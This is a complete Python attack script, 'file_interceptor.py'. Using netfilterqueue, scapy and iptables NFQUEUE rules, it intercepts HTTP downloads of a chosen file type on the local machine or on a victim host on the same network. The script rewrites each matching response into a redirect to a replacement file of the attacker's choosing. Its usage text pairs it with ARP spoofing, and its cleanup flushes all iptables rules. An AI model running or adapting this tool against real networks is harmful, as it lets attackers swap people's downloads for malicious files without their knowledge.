#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              07 December 2020 
* Filename:             file_interceptor.py
* Example Run (Linux):  python3 file_interceptor.py -l https://www.rarlab.com/rar/rarlinux-6.0.b2.tar.gz -f pdf -t local
"""

import argparse
import subprocess
import netfilterqueue
import scapy.all as scapy

"""
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("[+] If the location of the file replacing the orginal file is https://www.rarlab.com/rar/rarlinux-6.0.b2.tar.gz, the file type to replace is PDF and the target system is local host, then run the script as:")
    print("\tpython3 " + __file__ + " -l rarlab.com/rar/rarlinux-6.0.b2.tar.gz -f pdf -t local")
    print("[+] If the location to the file replacing the orginal file is https://www.rarlab.com/rar/rarlinux-6.0.b2.tar.gz, the file type to replace is PDF and the target system is another host in the same network, then run the script as:")
    print("\tpython3 " + __file__ + " -l rarlab.com/rar/rarlinux-6.0.b2.tar.gz -f pdf -t other")
    print("Also make sure the ARP spoofing script is running in the case of other systems.\n")    

""" 
* Function Name:  get_file_interceptor_args()
* Input:          None
* Output:         args.location (string): Path to the replacement file.
*                 args.filetype (string): File type of the file to be replaced.
*                 args.target (string): Specifies whether we are trying to replace a file downloaded in the local system or another system in the network. 
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   file_loc, file_type, target = get_file_interceptor_args()
"""
def get_file_interceptor_args():
    parser = argparse.ArgumentParser()  
    parser.add_argument("-l", "--location", type=str, help="Location of the replacement file (required)")                                
    parser.add_argument("-f", "--filetype", type=str, help="File type of the file to be replaced (required)")
    parser.add_argument("-t", "--target", type=str, help="Either 'local' or 'other'. Specifies whether we are trying to spoof the DNS for the local system or another system in the network. (required)")
    args = parser.parse_args()

    if((args.location == None) and (args.filetype == None) and (args.target == None)):
        print("\nError: Arguments missing!! Pass the location to the replacement file, the file type to replace and target (local/other) as an argument to the script.")
        print_sample_usage_msg()        

    elif(args.location == None):
        print("\nError: Replacement file missing!! Pass the location to the replacement file as an argument to the script.")
        print_sample_usage_msg()

    elif(args.filetype == None):
        print("\nError: File type missing!! Pass the file type to replace as an argument to the script.")
        print_sample_usage_msg()

    elif(args.target == None):
        print("\nError: Target missing!! Pass the target (local/other) as an argument to the script.")
        print_sample_usage_msg()

    return args.location, args.filetype, args.target

""" 
* Function Name:  create_packet_queue()
* Input:          target (string): Specifies whether the target is our local system or another system in the network. 
* Output:         1 if the packet queue is created successfully or else 0
* Logic:          Creating a packet queue in the system using subprocessor calls so that the packets will move out only after they 
*                 are modified by our script.
* Example Call:   created = create_packet_queue("local")
"""
def create_packet_queue(target):
    if(target == "local"):
        subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        return 1
    
    elif(target == "other"):
        subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        return 1

    return 0

""" 
* Function Name:  flush_packet_queue()
* Input:          None
* Output:         None
* Logic:          The function is used to remove all the created packet queues.
* Example Call:   flush_packet_queue()
"""
def flush_packet_queue():
    subprocess.call("sudo iptables --flush", shell=True)

""" 
* Function Name:  validate_file_type()
* Input:          file_type (string): File type of the file to be replaced.
* Output:         1 if the file type is valid or else 0
* Logic:          The function is used to validate the file type passed as an argument to the script.
* Example Call:   valid_file_type = validate_file_type("pdf")
"""
def validate_file_type(file_type):
    file_type_list = ["jpg", "jpx", "png", "gif", "webp", "cr2", "tif", "bmp", "jxr", "psd", "ico", "heic", "mp4", "m4v", "mkv", "webm", "mov", "avi", "wmv", "mpg", "flv", "mid", "mp3", "m4a", "ogg", "flac", "wav", "amr", "epub", "zip", "tar", "rar", "gz", "bz2", "7z", "xz", "pdf", "exe", "swf", "rtf", "eot", "ps", "sqlite", "nes", "crx", "cab", "deb", "ar", "Z", "lz", "woff", "woff2", "ttf", "otf"]

    if(file_type in file_type_list):
        return 1

    return 0

""" 
* Function Name:  append_protocol()
* Input:          file_loc (string): Path to the replacement file in which the protocol (i.e. HTTP/HTTPS) may not be present.
* Output:         file_loc (string): Path to the replacement file with the protocol appended if it didn't exist before.
* Logic:          The function appends http:// to the start of file_loc if the protocol was not already specified by the user in the file_loc input. 
* Example Call:   file_loc = append_protocol("rarlab.com/rar/rarlinux-6.0.b2.tar.gz")
"""
def append_protocol(file_loc):
    if((file_loc[:7] != "http://") and (file_loc[:8] != "https://")):
        file_loc = "http://" + file_loc
        return file_loc

    return file_loc

""" 
* Function Name:  process_packet()
* Input:          packet (string): The packet in the packet queue.
* Output:         None
* Logic:          A callback function used to process each packet in the queue. It modifies the location of the file to be downloaded in the packet
*                 and sends the modified packet to the target.
* Example Call:   process_packet(packet)
"""
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if(scapy_packet.haslayer(scapy.Raw)):
        if(scapy_packet.haslayer(scapy.TCP)):
            if(scapy_packet[scapy.TCP].dport == 80):
                if(file_type in scapy_packet[scapy.Raw].load.decode('utf-8')):
                    print("\nReceived HTTP Request to download a " + file_type + " file...")
                    ack_list.append(scapy_packet[scapy.TCP].ack)

            elif(scapy_packet[scapy.TCP].sport == 80):
                if(scapy_packet[scapy.TCP].seq in ack_list):
                    ack_list.remove(scapy_packet[scapy.TCP].seq)

                    print("Received back HTTP Response for downloading file...")

                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + file_loc + "\n\n"

                    del(scapy_packet[scapy.IP].len)
                    del(scapy_packet[scapy.IP].chksum)
                    del(scapy_packet[scapy.TCP].chksum)

                    packet.set_payload(bytes(scapy_packet))

                    print("SUCCESSFULLY modified response and sent to target.")

    packet.accept()


if __name__ == "__main__":
    file_loc, file_type, target = get_file_interceptor_args()
    
    if((file_loc != None) and (file_type != None) and (target != None)):
        try:
            created = create_packet_queue(target)
            
            if(created):
                valid_file_type = validate_file_type(file_type)
                
                if(valid_file_type):
                    print("\nStarting File Interceptor...\n")

                    ack_list = []
                    file_loc = append_protocol(file_loc)

                    queue = netfilterqueue.NetfilterQueue()
                    queue.bind(0, process_packet)
                    queue.run()

                else:
                    print("\nERROR: Please specify a valid file type.")
                    print_sample_usage_msg()

            else:
                print("\nERROR: Please specify a valid target. The target should be either 'local' or 'other'.")
                print_sample_usage_msg()

        except KeyboardInterrupt: 
            print("\n\nStopping File Interceptor...")

        finally:
            if(created):
                print("Flushing created IP queues...")
                flush_packet_queue()
                print("\nDONE.\n")